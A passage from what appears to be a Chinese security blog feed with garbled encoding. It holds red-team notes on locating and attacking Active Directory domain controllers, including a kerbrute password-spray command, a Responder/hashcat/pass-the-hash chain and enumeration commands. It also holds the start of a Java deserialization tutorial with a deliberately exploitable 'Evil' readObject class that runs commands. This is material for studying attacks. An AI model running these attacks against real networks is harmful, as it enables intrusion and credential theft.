href="https://blog.csdn.net/seaskying/article/details/9361181">https://blog.csdn.net/seaskying/article/details/9361181</a></p><p><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%9A%84%E5%A4%9A%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95">https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%9A%84%E5%A4%9A%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95</a></p><p><a href="https://pythonpig.github.io/2016/12/21/%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%9F%A5%E8%AF%86%E6%B1%87%E6%80%BB/">https://pythonpig.github.io/2016/12/21/%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%9F%A5%E8%AF%86%E6%B1%87%E6%80%BB/</a></p><p><a href="https://docs.microsoft.com/zh-cn/windows-server/remote/remote-desktop-services/clients/remote-desktop-supported-config">https://docs.microsoft.com/zh-cn/windows-server/remote/remote-desktop-services/clients/remote-desktop-supported-config</a></p><p><a href="http://t3ngyu.leanote.com/post/LM-RDP">http://t3ngyu.leanote.com/post/LM-RDP</a></p><p><a href="https://www.cnblogs.com/mujj/articles/3065895.html">https://www.cnblogs.com/mujj/articles/3065895.html</a></p><p><a href="https://www.tomshardware.com/reviews/enable-remote-desktop-in-windows-server-2016,5592.html">https://www.tomshardware.com/reviews/enable-remote-desktop-in-windows-server-2016,5592.html</a></p><p><a href="https://blog.yowko.com/windows-server-2016-enable-remote-desktop/#%E4%BD%BF%E7%94%A8-powershell">https://blog.yowko.com/windows-server-2016-enable-remote-desktop/#%E4%BD%BF%E7%94%A8-powershell</a></p><p><a href="https://www.rootusers.com/how-to-enable-remote-desktop-in-windows-server-2019/">https://www.rootusers.com/how-to-enable-remote-desktop-in-windows-server-2019/</a></p><p><a href="https://www.k0rz3n.com/2018/06/26/windows%E6%B8%97%E9%80%8F%E4%B8%AD%E5%90%8E%E9%97%A8%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%96%B9%E6%B3%95%E6%8E%A2%E7%A9%B6/">https://www.k0rz3n.com/2018/06/26/windows%E6%B8%97%E9%80%8F%E4%B8%AD%E5%90%8E%E9%97%A8%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%96%B9%E6%B3%95%E6%8E%A2%E7%A9%B6/</a></p><p><a href="https://hackergu.com/power-shadowuser/">https://hackergu.com/power-shadowuser/</a></p><p><a href="http://www.91ri.org/2234.html">http://www.91ri.org/2234.html</a></p><h1 id="åŸŸå¤–å¯»æ‰¾åŸŸæ§æ€è·¯"><a href="#åŸŸå¤–å¯»æ‰¾åŸŸæ§æ€è·¯" class="headerlink" title="åŸŸå¤–å¯»æ‰¾åŸŸæ§æ€è·¯"></a>åŸŸå¤–å¯»æ‰¾åŸŸæ§æ€è·¯</h1><p>ä¸»è¦æ˜¯ç«¯å£æ‰«æã€‚</p><h2 id="æ‰«æå†…ç½‘ä¸­åŒæ—¶å¼€æ”¾389å’Œ53ç«¯å£çš„æœºå™¨ã€88å’Œ389ç«¯å£"><a href="#æ‰«æå†…ç½‘ä¸­åŒæ—¶å¼€æ”¾389å’Œ53ç«¯å£çš„æœºå™¨ã€88å’Œ389ç«¯å£" class="headerlink" title="æ‰«æå†…ç½‘ä¸­åŒæ—¶å¼€æ”¾389å’Œ53ç«¯å£çš„æœºå™¨ã€88å’Œ389ç«¯å£"></a>æ‰«æå†…ç½‘ä¸­åŒæ—¶å¼€æ”¾389å’Œ53ç«¯å£çš„æœºå™¨ã€88å’Œ389ç«¯å£</h2><p>ç«¯å£ï¼š389<br>æœåŠ¡ï¼šLDAPã€ILS<br>è¯´æ˜ï¼šè½»å‹ç›®å½•è®¿é—®åè®®å’ŒNetMeeting Internet Locator Serverå…±ç”¨è¿™ä¸€ç«¯å£ã€‚</p><p>ç«¯å£ï¼š53<br>æœåŠ¡ï¼šDomain Name Serverï¼ˆDNSï¼‰<br>è¯´æ˜ï¼š53ç«¯å£ä¸ºDNS(Domain Name Serverï¼ŒåŸŸåæœåŠ¡å™¨)æœåŠ¡å™¨æ‰€å¼€æ”¾ï¼Œä¸»è¦ç”¨äºåŸŸåè§£æï¼ŒDNSæœåŠ¡åœ¨NTç³»ç»Ÿä¸­ä½¿ç”¨çš„æœ€ä¸ºå¹¿æ³›ã€‚é€šè¿‡DNSæœåŠ¡å™¨å¯ä»¥å®ç°åŸŸåä¸IPåœ°å€ä¹‹é—´çš„è½¬æ¢ï¼Œåªè¦è®°ä½åŸŸåå°±å¯ä»¥å¿«é€Ÿè®¿é—®ç½‘ç«™ã€‚</p><p>ç«¯å£ï¼š88</p><p>æœåŠ¡ï¼š88/UDPï¼ˆç”¨æˆ·æ•°æ®æŠ¥åè®®ï¼‰â€“ Kerberos</p><p>Kerberos åè®®æ˜¯ä¸€ç§åŸºäºå¯†é’¥åˆ†å‘æ¨¡å‹çš„ç½‘ç»œèº«ä»½éªŒè¯æ–¹æ³•ã€‚è¯¥åè®®ä½¿åœ¨ç½‘ç»œä¸Šè¿›è¡Œé€šä¿¡çš„å®ä½“èƒ½å¤Ÿè¯æ˜å½¼æ­¤çš„èº«ä»½ï¼ŒåŒæ—¶è¯¥åè®®å¯ä»¥é˜»æ­¢çªƒå¬æˆ–é‡æ”¾æ”»å‡»ã€‚ Kerberos å¯†é’¥åˆ†å‘ä¸­å¿ƒ (KDC) åœ¨è¯¥ç«¯å£ä¸Šä¾¦å¬ç¥¨è¯è¯·æ±‚ã€‚Kerberos åè®®çš„ 88 ç«¯å£ä¹Ÿå¯ä»¥æ˜¯ TCP/UDPã€‚</p><p>å¤–ç½‘ä½¿ç”¨è¯¥åŠŸèƒ½éœ€è¦å°†æœåŠ¡ç«¯æœºå™¨çš„æŸ¥å¸ç«¯å£2531æ˜ å°„åˆ°å¤–ç½‘ã€‚</p><h1 id="åŸŸå¤–å¦‚ä½•æ‰“åŸŸæ§"><a href="#åŸŸå¤–å¦‚ä½•æ‰“åŸŸæ§" class="headerlink" title="åŸŸå¤–å¦‚ä½•æ‰“åŸŸæ§"></a>åŸŸå¤–å¦‚ä½•æ‰“åŸŸæ§</h1><h2 id="ä¸çŸ¥é“æ˜¯ä»€ä¹ˆæ–¹æ³•çš„æ–¹æ³•"><a href="#ä¸çŸ¥é“æ˜¯ä»€ä¹ˆæ–¹æ³•çš„æ–¹æ³•" class="headerlink" title="ä¸çŸ¥é“æ˜¯ä»€ä¹ˆæ–¹æ³•çš„æ–¹æ³•"></a>ä¸çŸ¥é“æ˜¯ä»€ä¹ˆæ–¹æ³•çš„æ–¹æ³•</h2><p><a href="https://cloud.tencent.com/developer/news/140493">https://cloud.tencent.com/developer/news/140493</a></p><p>Responder æŠ“åˆ°ä¸€å°åŸŸå†…æœºå™¨çš„Net-NTLM v2 Hash ï¼ŒCME æ£€æŸ¥NetBIOSï¼Œç¡®å®šæ˜¯å¦å’Œç”¨æˆ·å¯¹åº”ï¼Œhashcat ç ´è§£Net-NTLM v2 Hashï¼Œè·å–åˆ° SAM æ–‡ä»¶å­˜å‚¨çš„NTLM Hashï¼Œpth &amp; psexecã€‚</p><p><a href="https://github.com/SpiderLabs/Responder">https://github.com/SpiderLabs/Responder</a></p><p><a href="https://github.com/byt3bl33d3r/CrackMapExec/releases">https://github.com/byt3bl33d3r/CrackMapExec/releases</a></p><h2 id="ZeroLogon"><a href="#ZeroLogon" class="headerlink" title="ZeroLogon"></a>ZeroLogon</h2><p>æœ‰ç©ºå¤ç°ä¸‹ï¼Œåˆ©ç”¨é“¾å’Œå¤ç°æ–‡ç« ç½‘ä¸Šéƒ½æœ‰ã€‚</p><h2 id="è´¦å·å¯†ç æš´ç ´"><a href="#è´¦å·å¯†ç æš´ç ´" class="headerlink" title="è´¦å·å¯†ç æš´ç ´"></a>è´¦å·å¯†ç æš´ç ´</h2><p>åœ¨å†…ç½‘ä¸­ï¼Œå°½é‡èƒ½æœé›†å°±å…ˆæœé›†ï¼Œçˆ†ç ´æšä¸¾ä¸åˆ°ä¸‡ä¸å¾—å·²çš„æƒ…å†µï¼Œä¸è¦ä½¿ç”¨ã€‚ï¼ˆæµé‡è®¾å¤‡ã€é˜²ç«å¢™ï¼‰</p><ul><li>Kerberos åŸŸç”¨æˆ·æš´ç ´</li></ul><p>kerbruteï¼Œè¯¥å·¥å…·å¯åœ¨éåŸŸä¸»æœºä¸Šä½¿ç”¨ï¼Œä¿æŒä¸»æœºä¸åŸŸæ§æœºå™¨é€šä¿¡æ­£å¸¸å³å¯ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;kerbrute_darwin_amd64 -domain DOMAIN_NAME -users user.txt -password P@ssword01! -dc-ip 192.168.1.2</span><br></pre></td></tr></table></figure><ul><li>DomainPasswordSpray</li></ul><h1 id="åŸŸå†…å¯»æ‰¾åŸŸæ§æ€è·¯"><a href="#åŸŸå†…å¯»æ‰¾åŸŸæ§æ€è·¯" class="headerlink" title="åŸŸå†…å¯»æ‰¾åŸŸæ§æ€è·¯"></a>åŸŸå†…å¯»æ‰¾åŸŸæ§æ€è·¯</h1><h2 id="å¸¸è§çš„å‘½ä»¤"><a href="#å¸¸è§çš„å‘½ä»¤" class="headerlink" title="å¸¸è§çš„å‘½ä»¤"></a>å¸¸è§çš„å‘½ä»¤</h2><ul><li>net group</li></ul><p>net group â€œdomain controllersâ€ /domain</p><ul><li>nltest</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest &#x2F;dclist:DOMAIN_NAME</span><br></pre></td></tr></table></figure><ul><li>net time /domain</li></ul><h2 id="æŸ¥è¯¢dnsè§£æè®°å½•"><a href="#æŸ¥è¯¢dnsè§£æè®°å½•" class="headerlink" title="æŸ¥è¯¢dnsè§£æè®°å½•"></a>æŸ¥è¯¢dnsè§£æè®°å½•</h2><p>è‹¥å½“å‰ä¸»æœºçš„dnsä¸ºåŸŸå†…dnsï¼Œå¯é€šè¿‡æŸ¥è¯¢dnsè§£æè®°å½•å®šä½åŸŸæ§ã€‚</p><p>DOMAIN_NAME ä¸º å·²çŸ¥çš„åŸŸåã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup -type&#x3D;all _ldap._tcp.dc._msdcs.DOMAIN_NAME</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nslookup</span><br><span class="line">set type&#x3D;all</span><br><span class="line">ldap.tcp.dc._msdcs.DOMAIN_NAME</span><br></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nslookup</span><br><span class="line">set type&#x3D;all</span><br><span class="line">_msdcs.DOMAIN_NAME</span><br></pre></td></tr></table></figure><p>åŸç†ï¼šåŸŸæ§æœåŠ¡å™¨ä¼šå‘DNSæœåŠ¡å™¨æ³¨å†ŒDNSè®°å½•ï¼Œä»¥ä¾¿å½“å®¢æˆ·ç«¯éœ€è¦åŠ å…¥åŸŸæˆ–è€…å’ŒåŸŸæœ‰å…¶ä»–äº¤äº’çš„æ—¶å€™ï¼Œå¯ä»¥æ‰¾åˆ°å®ƒã€‚</p><p><strong>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œä½¿ç”¨nslookupçš„æ—¶å€™ï¼ŒDNSæœåŠ¡å™¨å¿…é¡»æ˜¯å†…éƒ¨DNSï¼Œå¦è€…æ˜¯æŸ¥è¯¢ä¸åˆ°è®°å½•çš„ï¼Œå› ä¸ºåŸŸæ§æœåŠ¡å™¨åªä¼šå‘å†…éƒ¨DNSæœåŠ¡å™¨æ³¨å†Œè¿™ä¸ªè®°å½•ã€‚</strong></p><blockquote><p>å¤§å¤šæƒ…å†µä¸‹ï¼Œå†…éƒ¨DNSæœåŠ¡å™¨å’ŒADåŸŸæ§æœåŠ¡å™¨é»˜è®¤éƒ¨ç½²åœ¨åŒä¸€å°æœåŠ¡å™¨ã€‚å¦‚æœæ˜¯è¿™ç§æƒ…å†µï¼Œæ‰¾åˆ°DNSæœåŠ¡å™¨å°±èƒ½æ‰¾åˆ°äº†åŸŸæ§æœåŠ¡å™¨ã€‚</p></blockquote><h2 id="SPN-æ‰«æ"><a href="#SPN-æ‰«æ" class="headerlink" title="SPN æ‰«æ"></a>SPN æ‰«æ</h2><p>å¤§éƒ¨åˆ†winç³»ç»Ÿé»˜è®¤å·²è‡ªå¸¦spnæ¢æµ‹å·¥å…·å³ï¼š<code>setspn.exe</code></p><p>æ­¤æ“ä½œæ— éœ€ç®¡ç†æƒé™</p><p>åŸŸå†…æœºå™¨æ‰§è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T target.com -Q *&#x2F;*</span><br></pre></td></tr></table></figure><h2 id="AdFind-exe"><a href="#AdFind-exe" class="headerlink" title="AdFind.exe"></a>AdFind.exe</h2><p>åˆ—å‡ºåŸŸæ§åˆ¶å™¨åç§°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -sc dclist</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢å½“å‰åŸŸä¸­åœ¨çº¿çš„è®¡ç®—æœºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -sc computers_active</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢å½“å‰åŸŸä¸­åœ¨çº¿çš„è®¡ç®—æœº(åªæ˜¾ç¤ºåç§°å’Œæ“ä½œç³»ç»Ÿ)ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -sc computers_active name operatingSystem</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢å½“å‰åŸŸä¸­æ‰€æœ‰è®¡ç®—æœºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -f &quot;objectcategory&#x3D;computer&quot;</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢å½“å‰åŸŸä¸­æ‰€æœ‰è®¡ç®—æœº(åªæ˜¾ç¤ºåç§°å’Œæ“ä½œç³»ç»Ÿ)ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -f &quot;objectcategory&#x3D;computer&quot; name operatingSystem</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢åŸŸå†…æ‰€æœ‰ç”¨æˆ·ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -users name</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢æ‰€æœ‰GPOï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -sc gpodmp</span><br></pre></td></tr></table></figure><p>ADSearch ä¹Ÿå¯ä»¥ã€‚</p><p><a href="https://github.com/tomcarver16/ADSearch">https://github.com/tomcarver16/ADSearch</a></p><h2 id="å‚è€ƒèµ„æ–™-1"><a href="#å‚è€ƒèµ„æ–™-1" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><p><a href="https://github.com/uknowsec/Active-Directory-Pentest-Notes/blob/master/Notes/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.md">https://github.com/uknowsec/Active-Directory-Pentest-Notes/blob/master/Notes/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.md</a></p><p><a href="http://www.code2sec.com/zai-nei-wang-huan-jing-zhong-ding-wei-adyu-kong-fu-wu-qi.html">http://www.code2sec.com/zai-nei-wang-huan-jing-zhong-ding-wei-adyu-kong-fu-wu-qi.html</a></p><p><a href="https://cloud.tencent.com/developer/news/140493">https://cloud.tencent.com/developer/news/140493</a></p><p><a href="https://hackergu.com/kerberos-sec-list-brute-user/">https://hackergu.com/kerberos-sec-list-brute-user/</a></p><p>88/TCP    Kerberos - è®¤è¯ä»£ç†</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210624111457.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;æ¬¢è¿å…³æ³¨å…¬ä¼—å·ï¼Œä»¥ååšå®¢ä¸æ›´æ–°äº†ï¼Œæ–‡ç« éƒ½åœ¨å…¬ä¼—å·å‘ã€‚&lt;/p&gt;</summary>
      
    
    
    
    
    <category term="çº¢è“å¯¹æŠ—" scheme="https://hack-for.fun/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
  </entry>
  
  <entry>
    <title>Javaååºåˆ—åŒ–ä¹‹URLDNSåˆ©ç”¨é“¾åˆ†æå­¦ä¹ ç¬”è®°</title>
    <link href="https://hack-for.fun/65bb.html"/>
    <id>https://hack-for.fun/65bb.html</id>
    <published>2021-04-05T07:58:38.000Z</published>
    <updated>2021-05-25T10:11:31.848Z</updated>
    
    <content type="html"><![CDATA[<p>é¦–å‘äºé˜¿é‡Œäº‘å…ˆçŸ¥ç¤¾åŒºï¼Œ<a href="https://xz.aliyun.com/t/9417">https://xz.aliyun.com/t/9417</a></p><a id="more"></a><h1 id="Javaååºåˆ—åŒ–"><a href="#Javaååºåˆ—åŒ–" class="headerlink" title="Javaååºåˆ—åŒ–"></a>Javaååºåˆ—åŒ–</h1><p>æˆ‘ä»¬éƒ½çŸ¥é“ä¸€ä¸ªå¯¹è±¡åªè¦å®ç°äº†Serilizableæ¥å£ï¼Œè¿™ä¸ªå¯¹è±¡å°±å¯ä»¥è¢«åºåˆ—åŒ–ï¼Œjavaçš„è¿™ç§åºåˆ—åŒ–æ¨¡å¼ä¸ºå¼€å‘è€…æä¾›äº†å¾ˆå¤šä¾¿åˆ©ï¼Œæˆ‘ä»¬å¯ä»¥ä¸å¿…å…³ç³»å…·ä½“åºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œåªè¦è¿™ä¸ªç±»å®ç°äº†Serilizableæ¥å£ï¼Œè¿™ä¸ªç±»çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•éƒ½ä¼šè‡ªåŠ¨åºåˆ—åŒ–ã€‚</p><p>Java åºåˆ—åŒ–æ˜¯æŒ‡æŠŠ Java å¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚åºåˆ—çš„è¿‡ç¨‹</p><ul><li>ObjectOutputStreamç±»çš„ writeObject() æ–¹æ³•å¯ä»¥å®ç°åºåˆ—åŒ–</li></ul><p>Java ååºåˆ—åŒ–æ˜¯æŒ‡æŠŠå­—èŠ‚åºåˆ—æ¢å¤ä¸º Java å¯¹è±¡çš„è¿‡ç¨‹</p><ul><li>ObjectInputStream ç±»çš„ readObject() æ–¹æ³•ç”¨äºååºåˆ—åŒ–ã€‚</li></ul><p>å®ç°java.io.Serializableæ¥å£æ‰å¯è¢«ååºåˆ—åŒ–ï¼Œè€Œä¸”æ‰€æœ‰å±æ€§å¿…é¡»æ˜¯å¯åºåˆ—åŒ–çš„<br>(ç”¨<code>transient</code> å…³é”®å­—ä¿®é¥°çš„å±æ€§é™¤å¤–ï¼Œä¸å‚ä¸åºåˆ—åŒ–è¿‡ç¨‹)</p><p>User.java(éœ€è¦åºåˆ—åŒ–çš„ç±»)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Serialization;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Main.java(åºåˆ—åŒ–å’Œååºåˆ—åŒ–)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Serialization;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        User user=<span class="keyword">new</span> User();</span><br><span class="line">        user.setName(<span class="string">&quot;LearnJava&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] serializeData=serialize(user);</span><br><span class="line">        FileOutputStream fout = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;user.bin&quot;</span>);</span><br><span class="line">        fout.write(serializeData);</span><br><span class="line">        fout.close();</span><br><span class="line">        User user2=(User) unserialize(serializeData);</span><br><span class="line">        System.out.println(user2.getName());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] serialize(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ByteArrayOutputStream btout = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objOut = <span class="keyword">new</span> ObjectOutputStream(btout);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> btout.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(<span class="keyword">final</span> <span class="keyword">byte</span>[] serialized)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ByteArrayInputStream btin = <span class="keyword">new</span> ByteArrayInputStream(serialized);</span><br><span class="line">        ObjectInputStream objIn = <span class="keyword">new</span> ObjectInputStream(btin);</span><br><span class="line">        <span class="keyword">return</span> objIn.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹user.binæ–‡ä»¶ï¼Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">00000000: aced 0005 7372 0012 5365 7269 616c 697a  ....sr..Serializ</span><br><span class="line">00000010: 6174 696f 6e2e 5573 6572 ade4 cb02 ab94  ation.User......</span><br><span class="line">00000020: b2b9 0200 014c 0004 6e61 6d65 7400 124c  .....L..namet..L</span><br><span class="line">00000030: 6a61 7661 2f6c 616e 672f 5374 7269 6e67  java&#x2F;lang&#x2F;String</span><br><span class="line">00000040: 3b78 7074 0009 4c65 6172 6e4a 6176 61    ;xpt..LearnJava</span><br></pre></td></tr></table></figure><blockquote><p>æ ¹æ®åºåˆ—åŒ–è§„èŒƒï¼Œacedä»£è¡¨javaåºåˆ—åŒ–æ•°æ®çš„magic wordSTREAM_MAGIC,0005è¡¨ç¤ºç‰ˆæœ¬å·STREAM_VERSION,73è¡¨ç¤ºæ˜¯ä¸€ä¸ªå¯¹è±¡TC_OBJECT,72è¡¨ç¤ºè¿™ä¸ªå¯¹è±¡çš„æè¿°TC_CLASSDESC</p></blockquote><h2 id="readObject-æ–¹æ³•"><a href="#readObject-æ–¹æ³•" class="headerlink" title="readObject()æ–¹æ³•"></a>readObject()æ–¹æ³•</h2><blockquote><p>ä»JAVAååºåˆ—åŒ–RCEçš„ä¸‰è¦ç´ ï¼ˆreadobjectååºåˆ—åŒ–åˆ©ç”¨ç‚¹ + åˆ©ç”¨é“¾ + RCEè§¦å‘ç‚¹ï¼‰æ¥è¯´ï¼Œæ˜¯é€šè¿‡ï¼ˆreadobjectååºåˆ—åŒ–åˆ©ç”¨ç‚¹ + DNSæŸ¥è¯¢ï¼‰æ¥ç¡®è®¤readobjectååºåˆ—åŒ–åˆ©ç”¨ç‚¹çš„å­˜åœ¨ã€‚</p></blockquote><p>å®ç°äº†java.io.Serializableæ¥å£çš„ç±»è¿˜å¯ä»¥å®šä¹‰å¦‚ä¸‹æ–¹æ³•(ååºåˆ—åŒ–é­”æœ¯æ–¹æ³•)å°†ä¼šåœ¨ç±»åºåˆ—åŒ–å’Œååºåˆ—åŒ–è¿‡ç¨‹ä¸­è°ƒç”¨ï¼š</p><ul><li>private void writeObject(ObjectOutputStream oos),è‡ªå®šä¹‰åºåˆ—åŒ–</li><li>private void readObject(ObjectInputStream ois),è‡ªå®šä¹‰ååºåˆ—åŒ–</li></ul><p>readObject()æ–¹æ³•è¢«é‡å†™çš„çš„è¯ï¼Œååºåˆ—åŒ–è¯¥ç±»æ—¶è°ƒç”¨ä¾¿æ˜¯é‡å†™åçš„readObject()æ–¹æ³•ã€‚å¦‚æœè¯¥æ–¹æ³•ä¹¦å†™ä¸å½“çš„è¯å°±æœ‰å¯èƒ½å¼•å‘æ¶æ„ä»£ç çš„æ‰§è¡Œï¼š</p><p>Evil.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> EvilSerializtion;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Evil</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String cmd;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream stream)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        stream.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Main.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> EvilSerializtion;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> 